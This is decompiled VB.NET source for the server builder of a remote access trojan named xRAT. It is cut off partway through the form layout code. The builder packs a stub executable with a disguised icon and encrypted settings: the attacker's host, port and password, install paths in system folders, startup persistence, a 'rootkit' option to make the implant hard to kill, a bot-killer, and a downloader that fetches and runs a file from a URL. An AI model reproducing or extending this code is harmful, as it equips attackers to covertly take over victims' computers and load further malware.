Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class Builder
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Builder_FormClosing)
            AddHandler MyBase.Paint, New PaintEventHandler(AddressOf Me.Builder_Paint)
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.Builder_Load)
            Me.InitializeComponent
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub _Lambda$__1(ByVal a0 As Object)
            Me.CheckConnection(Conversions.ToBoolean(a0))
        End Sub

        Private Sub Builder_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            If Me.Label9.Visible Then
                e.Cancel = True
                Interaction.MsgBox("Please wait...", MsgBoxStyle.Information, Nothing)
            End If
        End Sub

        Private Sub Builder_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.TextBox5.PasswordChar = ChrW(9679)
            Me.TextBox6.Enabled = False
            Me.Button3.Enabled = False
            Me.CheckBox3.BackColor = Color.FromArgb(&H27, &H27, &H27)
            Me.Win8Progressbar1.Value = 0
            Me.PictureBox5.Image = Nothing
            Dim str As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
            Me.TextBox_0.Text = Conversions.ToString(Me.method_1(&H11, str))
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Private Sub Builder_Paint(ByVal sender As Object, ByVal e As PaintEventArgs)
            e.Graphics.DrawLine(New Pen(Color.Black, 1!), 0, 350, &H256, 350)
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim box As TextBox
            Me.method_0
            Me.Win8Progressbar1.Value = 0
            Dim path As String = (FileSystem.CurDir & "\data\template.exe")
            If Not File.Exists(path) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Stub not found!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Stub not found!")
                End If
                goto Label_0A7E
            End If
            If (Me.TextBox1.Text = Nothing) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Please enter a Host or IP!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Host or IP!")
                End If
                Me.SideTab1.SelectedTab = Me.TabPage3
                Me.TextBox1.Focus
                goto Label_0A7E
            End If
            If (Me.TextBox2.Text = Nothing) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Please enter a Port!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Port!")
                End If
                Me.SideTab1.SelectedTab = Me.TabPage3
                Me.TextBox2.Focus
                goto Label_0A7E
            End If
            If (Me.TextBox8.Text = Nothing) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Please enter a Server-Name!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Server-Name!")
                End If
                Me.SideTab1.SelectedTab = Me.TabPage4
                Me.TextBox8.Focus
                goto Label_0A7E
            End If
            If (Me.TextBox5.Text = Nothing) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Please enter a Password!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Password!")
                End If
                Me.SideTab1.SelectedTab = Me.TabPage3
                Me.TextBox5.Focus
                goto Label_0A7E
            End If
            If (Me.TextBox3.Text = Nothing) Then
                If (Me.TextBox4.Text = Nothing) Then
                    box = Me.TextBox4
                    box.Text = (box.Text & "> Please enter a Startup-Name!")
                Else
                    box = Me.TextBox4
                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Startup-Name!")
                End If
                Me.SideTab1.SelectedTab = Me.TabPage4
                Me.TextBox3.Focus
                goto Label_0A7E
            End If
            If (Me.TextBox_0.Text <> Nothing) Then
                Using dialog As SaveFileDialog = New SaveFileDialog
                    dialog.Filter = "EXE Files *.exe|*.exe"
                    If (dialog.ShowDialog = DialogResult.OK) Then
                        If Not File.Exists(dialog.FileName) Then
                            Me.TextBox4.Text = Nothing
                            box = Me.TextBox4
                            box.Text = (box.Text & "> Starting now...")
                            Try 
                                Dim num As Integer
                                Dim num2 As Integer
                                Dim text As String
                                Me.Win8Progressbar1.Value = 2
                                Thread.Sleep(200)
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Preparing Stub...")
                                File.Copy(path, dialog.FileName, True)
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Stub successful prepared!")
                                If Me.CheckBox2.Checked Then
                                    If File.Exists(Me.TextBox6.Text) Then
                                        IconInjector.InjectIcon(dialog.FileName, Me.TextBox6.Text)
                                        box = Me.TextBox4
                                        box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Changing Icon...")
                                        Me.Win8Progressbar1.Value = 4
                                        Thread.Sleep(200)
                                        box = Me.TextBox4
                                        box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Icon successful changed!")
                                    Else
                                        box = Me.TextBox4
                                        box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Icon not found!")
                                        Me.Win8Progressbar1.Value = 4
                                        Thread.Sleep(200)
                                    End If
                                End If
                                If Not Me.CheckBox_5.Checked Then
                                    Me.TextBox_2.Text = ""
                                End If
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Getting Settings...")
                                If (Me.TextBox9.Text.Trim = Nothing) Then
                                    [text] = "0"
                                Else
                                    [text] = Me.TextBox9.Text
                                End If
                                If Me.RadioButton1.Checked Then
                                    num2 = 1
                                ElseIf Me.RadioButton2.Checked Then
                                    num2 = 2
                                ElseIf Me.RadioButton3.Checked Then
                                    num2 = 3
                                ElseIf Me.RadioButton4.Checked Then
                                    num2 = 4
                                ElseIf Me.RadioButton5.Checked Then
                                    num2 = 5
                                ElseIf Me.RadioButton6.Checked Then
                                    num2 = 6
                                End If
                                If Not Me.RadioButton6.Checked Then
                                End If
                                Me.Win8Progressbar1.Value = 5
                                Thread.Sleep(200)
                                If Me.CheckBox5.Checked Then
                                    num = 1
                                ElseIf Me.CheckBox6.Checked Then
                                    num = 2
                                Else
                                    num = 0
                                End If
                                Me.Win8Progressbar1.Value = 6
                                Thread.Sleep(200)
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Got Settings!")
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Encrypting Settings...")
                                Dim s As String = Class2.Class4_0.method_6.Encrypt("HADES666", String.Concat(New String() { "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox1.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox2.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homerPWD24", Me.TextBox5.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox7.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", (Me.TextBox8.Text & ".exe")), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox3.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", [text]), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Conversions.ToString(num2)), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Conversions.ToString(num)), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox_0.Text), "|//666\\|", Class2.Class4_0.method_6.Encrypt("Secr2t-pizza-homer", Me.TextBox_2.Text) }))
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Settings successful encrypted!")
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Writing Resources...")
                                Class7.smethod_1(dialog.FileName, Encoding.Default.GetBytes(s))
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Resources successful written!")
                                Me.Win8Progressbar1.Value = 8
                                Thread.Sleep(200)
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Done!")
                                box = Me.TextBox4
                                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Server saved to: " & dialog.FileName)
                                Dim items As String() = New String(3  - 1) {}
                                items(0) = Conversions.ToString(DateTime.Now)
                                items(1) = "Server created."
                                Dim item As New ListViewItem(items)
                                Class2.Class4_0.method_6.ListView1.Items.Add(item)
                                Me.Win8Progressbar1.Value = 10
                            Catch exception1 As Exception
                                ProjectData.SetProjectError(exception1)
                                If (Me.TextBox4.Text = Nothing) Then
                                    box = Me.TextBox4
                                    box.Text = (box.Text & "> Error while creating the server!")
                                Else
                                    box = Me.TextBox4
                                    box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Error while creating the server:")
                                End If
                                ProjectData.ClearProjectError
                            End Try
                        ElseIf (Me.TextBox4.Text = Nothing) Then
                            box = Me.TextBox4
                            box.Text = (box.Text & "> A Server with this name already exists!")
                        Else
                            box = Me.TextBox4
                            box.Text = (box.Text & ChrW(13) & ChrW(10) & "> A Server with this name already exists!")
                        End If
                    End If
                    goto Label_07CF
                End Using
            End If
            If (Me.TextBox4.Text = Nothing) Then
                box = Me.TextBox4
                box.Text = (box.Text & "> Please enter a Mutex!")
            Else
                box = Me.TextBox4
                box.Text = (box.Text & ChrW(13) & ChrW(10) & "> Please enter a Mutex!")
            End If
        Label_07CF:
            Me.SideTab1.SelectedTab = Me.TabPage4
            Me.TextBox_0.Focus
        Label_0A7E:
            Me.TextBox4.SelectionStart = Me.TextBox4.Text.Length
            Me.TextBox4.ScrollToCaret
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim listening As Boolean = Class2.Class4_0.method_6.listening
            Me.thread_0 = New Thread(New ParameterizedThreadStart(AddressOf Me._Lambda$__1))
            Me.thread_0.IsBackground = True
            Me.thread_0.Start(listening)
            Me.PictureBox5.Image = Class5.smethod_49
            Me.Button2.Enabled = False
        End Sub

        Private Sub Button3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim dialog As New OpenFileDialog With { _
                .Filter = "Icon (*.ico) |*.ico" _
            }
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.TextBox6.Text = dialog.FileName
                Try 
                    Me.PictureBox1.Image = Image.FromFile(Me.TextBox6.Text)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError
                End Try
            End If
        End Sub

        Private Sub Button4_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim str As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
            Me.TextBox_0.Text = Conversions.ToString(Me.method_1(&H11, str))
        End Sub

        Private Sub CheckBox_5_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub CheckBox1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.CheckBox1.Checked Then
                Me.TextBox5.PasswordChar = ChrW(0)
            ElseIf Not Me.CheckBox1.Checked Then
                Me.TextBox5.PasswordChar = ChrW(9679)
            End If
        End Sub

        Private Sub CheckBox2_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.CheckBox2.Checked Then
                Me.TextBox6.Enabled = True
                Me.Button3.Enabled = True
            ElseIf Not Me.CheckBox2.Checked Then
                Me.TextBox6.Enabled = False
                Me.Button3.Enabled = False
            End If
        End Sub

        Private Sub CheckBox3_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            Dim point As Point
            If Me.CheckBox3.Checked Then
                point = New Point(&H256, &H20C)
                Me.Size = DirectCast(point, Size)
            ElseIf Not Me.CheckBox3.Checked Then
                point = New Point(&H256, &H1B1)
                Me.Size = DirectCast(point, Size)
            End If
        End Sub

        Public Sub CheckConnection(ByVal isListening As Boolean)
            If Not isListening Then
                If ((Me.TextBox1.Text = Nothing) Or (Me.TextBox2.Text = Nothing)) Then
                    Me.Invoke(New DelegateToggleConnectionResult(AddressOf Me.ToggleConnectionResult), New Object() { 4 })
                    Me.Invoke(New DelShowit(AddressOf Me.Showit))
                    Me.Invoke(New DelegateStopCheck(AddressOf Me.StopCheck))
                End If
                Dim text As String = Me.TextBox1.Text
                Try 
                    If [text].Contains("http://www.") Then
                        [text] = Dns.GetHostEntry([text].Replace("http://www.", String.Empty)).AddressList(0).ToString
                    ElseIf [text].Contains("www.") Then
                        [text] = Dns.GetHostEntry([text].Replace("www.", String.Empty)).AddressList(0).ToString
                    ElseIf [text].Contains("http://") Then
                        [text] = Dns.GetHostEntry([text].Replace("http://", String.Empty)).AddressList(0).ToString
                    Else
                        [text] = Dns.GetHostEntry([text]).AddressList(0).ToString
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError
                End Try
                Try 
                    Dim listener As New TcpListener(IPAddress.Any, Conversions.ToInteger(Me.TextBox2.Text))
                    listener.Start
                    Dim client As New TcpClient([text], Conversions.ToInteger(Me.TextBox2.Text))
                    If client.Connected Then
                        Me.Invoke(New DelegateToggleConnectionResult(AddressOf Me.ToggleConnectionResult), New Object() { 0 })
                    End If
                    client.Close
                    listener.Stop
                    goto Label_022E
                Catch exception2 As Exception
                    ProjectData.SetProjectError(exception2)
                    Me.Invoke(New DelegateToggleConnectionResult(AddressOf Me.ToggleConnectionResult), New Object() { 1 })
                    ProjectData.ClearProjectError
                    goto Label_022E
                End Try
            End If
            Me.Invoke(New DelegateToggleConnectionResult(AddressOf Me.ToggleConnectionResult), New Object() { 3 })
            Interaction.MsgBox("Please stop listening before you test your connection!", MsgBoxStyle.Information, Nothing)
        Label_022E:
            Me.Invoke(New DelegateStopCheck(AddressOf Me.StopCheck))
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.icontainer_0 = New Container
            Dim manager As New ComponentResourceManager(GetType(Builder))
            Me.TabPage1 = New TabPage
            Me.TabPage2 = New TabPage
            Me.TextBox4 = New TextBox
            Me.CheckBox3 = New CheckBox
            Me.ToolTip1 = New ToolTip(Me.icontainer_0)
            Me.TextBox5 = New TextBox
            Me.Label8 = New Label
            Me.TabPage6 = New TabPage
            Me.GroupBox_0 = New GroupBox
            Me.TextBox_2 = New TextBox
            Me.CheckBox_5 = New CheckBox
            Me.GroupBox8 = New GroupBox
            Me.PictureBox7 = New PictureBox
            Me.CheckBox6 = New CheckBox
            Me.CheckBox4 = New CheckBox
            Me.Label10 = New Label
            Me.TextBox7 = New TextBox
            Me.CheckBox5 = New CheckBox
            Me.Label20 = New Label
            Me.TabPage5 = New TabPage
            Me.GroupBox7 = New GroupBox
            Me.PictureBox1 = New PictureBox
            Me.GroupBox6 = New GroupBox
            Me.TextBox6 = New TextBox
            Me.Button3 = New Button
            Me.CheckBox2 = New CheckBox
            Me.Label19 = New Label
            Me.TabPage4 = New TabPage
            Me.GroupBox9 = New GroupBox
            Me.Button4 = New Button
            Me.TextBox_0 = New TextBox
            Me.Label14 = New Label
            Me.GroupBox3 = New GroupBox
            Me.Label12 = New Label
            Me.Label6 = New Label
            Me.Label13 = New Label
            Me.TextBox3 = New TextBox
            Me.TextBox8 = New TextBox
            Me.GroupBox2 = New GroupBox
            Me.RadioButton6 = New RadioButton
            Me.PictureBox6 = New PictureBox
            Me.RadioButton5 = New RadioButton
            Me.RadioButton4 = New RadioButton
            Me.Label11 = New Label
            Me.Label7 = New Label
            Me.PictureBox3 = New PictureBox
            Me.Label5 = New Label
            Me.PictureBox2 = New PictureBox
            Me.TextBox9 = New TextBox
            Me.RadioButton3 = New RadioButton
            Me.RadioButton1 = New RadioButton
            Me.RadioButton2 = New RadioButton
            Me.GroupBox1 = New GroupBox
            Me.Label15 = New Label
            Me.TabPage3 = New TabPage
            Me.GroupBox5 = New GroupBox
            Me.Label9 = New Label
            Me.PictureBox5 = New PictureBox
            Me.Label18 = New Label
            Me.Button2 = New Button
            Me.GroupBox4 = New GroupBox
            Me.PictureBox4 = New PictureBox
            Me.Label1 = New Label
            Me.Label4 = New Label
            Me.CheckBox1 = New CheckBox
            Me.Label2 = New Label
            Me.Label3 = New Label
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.Label16 = New Label
            Me.SideTab1 = New Control0
            Me.TabPage7 = New TabPage
            Me.TextBox_1 = New TextBox
            Me.Label17 = New Label
            Me.CheckBox_0 = New CheckBox
            Me.CheckBox_1 = New CheckBox
            Me.CheckBox_2 = New CheckBox
            Me.CheckBox_3 = New CheckBox
            Me.CheckBox7 = New CheckBox
            Me.CheckBox8 = New CheckBox
            Me.CheckBox9 = New CheckBox
            Me.CheckBox_4 = New CheckBox
            Me.Win8Progressbar1 = New Win8Progressbar
            Me.Button1 = New Button
            Me.TabPage6.SuspendLayout
            Me.GroupBox_0.SuspendLayout
            Me.GroupBox8.SuspendLayout
            DirectCast(Me.PictureBox7, ISupportInitialize).BeginInit
            Me.TabPage5.SuspendLayout
            Me.GroupBox7.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.GroupBox6.SuspendLayout
            Me.TabPage4.SuspendLayout
            Me.GroupBox9.SuspendLayout
            Me.GroupBox3.SuspendLayout
            Me.GroupBox2.SuspendLayout
            DirectCast(Me.PictureBox6, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox3, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox2, ISupportInitialize).BeginInit
            Me.GroupBox1.SuspendLayout
            Me.TabPage3.SuspendLayout
            Me.GroupBox5.SuspendLayout
            DirectCast(Me.PictureBox5, ISupportInitialize).BeginInit
            Me.GroupBox4.SuspendLayout
            DirectCast(Me.PictureBox4, ISupportInitialize).BeginInit
            Me.SideTab1.SuspendLayout
            Me.TabPage7.SuspendLayout
            Me.SuspendLayout
            Me.TabPage1.BackColor = Color.White
            Dim point As New Point(140, 4)
            Me.TabPage1.Location = point
            Me.TabPage1.Name = "TabPage1"
            Dim padding As New Padding(3)
            Me.TabPage1.Padding = padding
            Dim size As New Size(&H1BC, &H156)
            Me.TabPage1.Size = size
            Me.TabPage1.TabIndex = 0
            Me.TabPage1.Text = "TabPage1"
            Me.TabPage2.BackColor = Color.White
            point = New Point(140, 4)
            Me.TabPage2.Location = point
            Me.TabPage2.Name = "TabPage2"
            padding = New Padding(3)
            Me.TabPage2.Padding = padding
            size = New Size(&H1BC, 260)
            Me.TabPage2.Size = size
            Me.TabPage2.TabIndex = 1
            Me.TabPage2.Text = "TabPage2"
            Me.TextBox4.BackColor = Color.White
            point = New Point(12, &H195)
            Me.TextBox4.Location = point
            Me.TextBox4.Multiline = True
            Me.TextBox4.Name = "TextBox4"
            Me.TextBox4.ReadOnly = True
            Me.TextBox4.ScrollBars = ScrollBars.Vertical
            size = New Size(&H234, &H4B)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = 2
            Me.CheckBox3.AutoSize = True
            Me.CheckBox3.BackColor = Color.FromArgb(&H40, &H40, &H40)
            Me.CheckBox3.ForeColor = Color.Silver
            point = New Point(11, &H147)
            Me.CheckBox3.Location = point
            Me.CheckBox3.Name = "CheckBox3"
            size = New Size(&H48, &H11)
            Me.CheckBox3.Size = size
            Me.CheckBox3.TabIndex = 4
            Me.CheckBox3.Text = "Show Log"
            Me.CheckBox3.UseVisualStyleBackColor = False
            point = New Point(&H44, 120)
            Me.TextBox5.Location = point
            Me.TextBox5.Name = "TextBox5"
            size = New Size(&HCD, &H15)
            Me.TextBox5.Size = size
            Me.TextBox5.TabIndex = 30
            Me.Label8.AutoSize = True
            point = New Point(6, &H7B)
            Me.Label8.Location = point
            Me.Label8.Name = "Label8"
            size = New Size(&H39, 13)
            Me.Label8.Size = size
            Me.Label8.TabIndex = &H23
            Me.Label8.Text = "Password:"
            Me.TabPage6.BackColor = Color.White
            Me.TabPage6.Controls.Add(Me.GroupBox_0)
            Me.TabPage6.Controls.Add(Me.GroupBox8)
            Me.TabPage6.Controls.Add(Me.Label20)
            point = New Point(140, 4)
            Me.TabPage6.Location = point
            Me.TabPage6.Name = "TabPage6"
            size = New Size(&H1BC, &H156)
            Me.TabPage6.Size = size
            Me.TabPage6.TabIndex = 3
            Me.TabPage6.Text = "Miscellaneous"
            Me.GroupBox_0.Controls.Add(Me.TextBox_2)
            Me.GroupBox_0.Controls.Add(Me.CheckBox_5)
            point = New Point(6, &HA7)
            Me.GroupBox_0.Location = point
            Me.GroupBox_0.Name = "GroupBox10"
            size = New Size(430, &H37)
            Me.GroupBox_0.Size = size
            Me.GroupBox_0.TabIndex = &H2C
            Me.GroupBox_0.TabStop = False
            Me.GroupBox_0.Text = "      Downloader"
            point = New Point(6, 20)
            Me.TextBox_2.Location = point
            Me.TextBox_2.Name = "TextBox12"
            size = New Size(&H1A2, &H15)
            Me.TextBox_2.Size = size
            Me.TextBox_2.TabIndex = 1
            Me.TextBox_2.Text = "http://www.website.com/legit.exe"
            Me.CheckBox_5.AutoSize = True
            point = New Point(11, 0)
            Me.CheckBox_5.Location = point
            Me.CheckBox_5.Name = "CheckBox15"
            size = New Size(15, 14)
            Me.CheckBox_5.Size = size
            Me.CheckBox_5.TabIndex = 0
            Me.CheckBox_5.UseVisualStyleBackColor = True
            Me.GroupBox8.Controls.Add(Me.PictureBox7)
            Me.GroupBox8.Controls.Add(Me.CheckBox6)
            Me.GroupBox8.Controls.Add(Me.CheckBox4)
            Me.GroupBox8.Controls.Add(Me.Label10)
            Me.GroupBox8.Controls.Add(Me.TextBox7)
            Me.GroupBox8.Controls.Add(Me.CheckBox5)
            point = New Point(6, &H25)
            Me.GroupBox8.Location = point
            Me.GroupBox8.Name = "GroupBox8"
            size = New Size(430, &H7C)
            Me.GroupBox8.Size = size
            Me.GroupBox8.TabIndex = &H2B
            Me.GroupBox8.TabStop = False
            Me.GroupBox8.Text = "Miscellaneous Settings"
            Me.PictureBox7.Image = Class5.smethod_88
            point = New Point(9, &H56)
            Me.PictureBox7.Location = point
            Me.PictureBox7.Name = "PictureBox7"
            size = New Size(&H10, 20)
            Me.PictureBox7.Size = size
            Me.PictureBox7.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox7.TabIndex = 40
            Me.PictureBox7.TabStop = False
            Me.CheckBox6.AutoSize = True
            point = New Point(&H1F, &H58)
            Me.CheckBox6.Location = point
            Me.CheckBox6.Name = "CheckBox6"
            size = New Size(&HC9, &H11)
            Me.CheckBox6.Size = size
            Me.CheckBox6.TabIndex = &H18
            Me.CheckBox6.Text = "Rootkit (make the server hard to kill)"
            Me.CheckBox6.UseVisualStyleBackColor = True
            Me.CheckBox4.AutoSize = True
            point = New Point(&H1F, &H42)
            Me.CheckBox4.Location = point
            Me.CheckBox4.Name = "CheckBox4"
            size = New Size(&H35, &H11)
            Me.CheckBox4.Size = size
            Me.CheckBox4.TabIndex = &H17
            Me.CheckBox4.Text = "Botkill"
            Me.CheckBox4.UseVisualStyleBackColor = True
            Me.Label10.AutoSize = True
            point = New Point(6, 20)
            Me.Label10.Location = point
            Me.Label10.Name = "Label10"
            size = New Size(&H2E, 13)
            Me.Label10.Size = size
            Me.Label10.TabIndex = 20
            Me.Label10.Text = "Version:"
            point = New Point(&H39, &H11)
            Me.TextBox7.Location = point
            Me.TextBox7.Name = "TextBox7"
            size = New Size(140, &H15)
            Me.TextBox7.Size = size
            Me.TextBox7.TabIndex = &H13
            Me.CheckBox5.AutoSize = True
            point = New Point(&H1F, &H2C)
            Me.CheckBox5.Location = point
            Me.CheckBox5.Name = "CheckBox5"
            size = New Size(120, &H11)
            Me.CheckBox5.Size = size
            Me.CheckBox5.TabIndex = &H16
            Me.CheckBox5.Text = "Startup Persistence"
            Me.CheckBox5.UseVisualStyleBackColor = True
            Me.Label20.AutoSize = True
            Me.Label20.Font = New Font("Microsoft Sans Serif", 18!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.Label20.ForeColor = SystemColors.ControlDarkDark
            point = New Point(6, 5)
            Me.Label20.Location = point
            Me.Label20.Name = "Label20"
            size = New Size(&HA8, &H1D)
            Me.Label20.Size = size
            Me.Label20.TabIndex = &H2A
            Me.Label20.Text = "Miscellaneous"
            Me.TabPage5.BackColor = Color.White
            Me.TabPage5.Controls.Add(Me.GroupBox7)
            Me.TabPage5.Controls.Add(Me.GroupBox6)
            Me.TabPage5.Controls.Add(Me.Label19)
            point = New Point(140, 4)
            Me.TabPage5.Location = point
            Me.TabPage5.Name = "TabPage5"
            size = New Size(&H1BC, &H156)
            Me.TabPage5.Size = size
            Me.TabPage5.TabIndex = 2
            Me.TabPage5.Text = "Icon"
            Me.GroupBox7.Controls.Add(Me.PictureBox1)
            point = New Point(6, &H86)
            Me.GroupBox7.Location = point
            Me.GroupBox7.Name = "GroupBox7"
            size = New Size(430, &H60)
            Me.GroupBox7.Size = size
            Me.GroupBox7.TabIndex = &H2B
            Me.GroupBox7.TabStop = False
            Me.GroupBox7.Text = "Preview"
            Me.PictureBox1.BackColor = Color.FromArgb(&HE0, &HE0, &HE0)
            point = New Point(6, &H13)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H40, &H40)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage
            Me.PictureBox1.TabIndex = &H17
            Me.PictureBox1.TabStop = False
            Me.GroupBox6.Controls.Add(Me.TextBox6)
            Me.GroupBox6.Controls.Add(Me.Button3)
            Me.GroupBox6.Controls.Add(Me.CheckBox2)
            point = New Point(6, &H25)
            Me.GroupBox6.Location = point
            Me.GroupBox6.Name = "GroupBox6"
            size = New Size(430, &H5B)
            Me.GroupBox6.Size = size
            Me.GroupBox6.TabIndex = &H2A
            Me.GroupBox6.TabStop = False
            Me.GroupBox6.Text = "Change Icon"
            point = New Point(6, &H13)
            Me.TextBox6.Location = point
            Me.TextBox6.Name = "TextBox6"
            size = New Size(&H108, &H15)
            Me.TextBox6.Size = size
            Me.TextBox6.TabIndex = &H16
            point = New Point(&H9E, &H2F)
            Me.Button3.Location = point
            Me.Button3.Name = "Button3"
            size = New Size(&H70, &H17)
            Me.Button3.Size = size
            Me.Button3.TabIndex = &H18
            Me.Button3.Text = "Browse Icon..."
            Me.Button3.UseVisualStyleBackColor = True
            Me.CheckBox2.AutoSize = True
            point = New Point(12, &H31)
            Me.CheckBox2.Location = point
            Me.CheckBox2.Name = "CheckBox2"
            size = New Size(&H57, &H11)
            Me.CheckBox2.Size = size
            Me.CheckBox2.TabIndex = &H19
            Me.CheckBox2.Text = "Change Icon"
            Me.CheckBox2.UseVisualStyleBackColor = True
            Me.Label19.AutoSize = True
            Me.Label19.Font = New Font("Microsoft Sans Serif", 18!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.Label19.ForeColor = SystemColors.ControlDarkDark
            point = New Point(6, 5)
            Me.Label19.Location = point
            Me.Label19.Name = "Label19"
            size = New Size(&H3A, &H1D)
            Me.Label19.Size = size
            Me.Label19.TabIndex = &H29
            Me.Label19.Text = "Icon"
            Me.TabPage4.BackColor = Color.White
            Me.TabPage4.Controls.Add(Me.GroupBox9)
            Me.TabPage4.Controls.Add(Me.Label14)
            Me.TabPage4.Controls.Add(Me.GroupBox3)
            Me.TabPage4.Controls.Add(Me.GroupBox2)
            Me.TabPage4.Controls.Add(Me.GroupBox1)
            point = New Point(140, 4)
            Me.TabPage4.Location = point
